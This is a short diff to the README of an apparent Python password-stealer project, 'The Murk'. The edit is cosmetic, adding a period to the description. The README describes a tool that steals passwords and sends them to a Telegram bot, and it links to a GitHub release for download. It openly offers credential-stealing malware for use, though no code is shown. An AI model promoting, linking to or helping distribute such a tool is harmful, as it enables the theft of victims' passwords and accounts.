@@ -3,7 +3,7 @@
 
 PASSWORD STEALER
 ---
-Stealer written on Python, results will be sent to Telegram bot
+Stealer written on Python, results will be sent to Telegram bot.
 [Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer-on-python/releases/tag/The_Murk_v2.0.0-2.9.9)
 
 ***
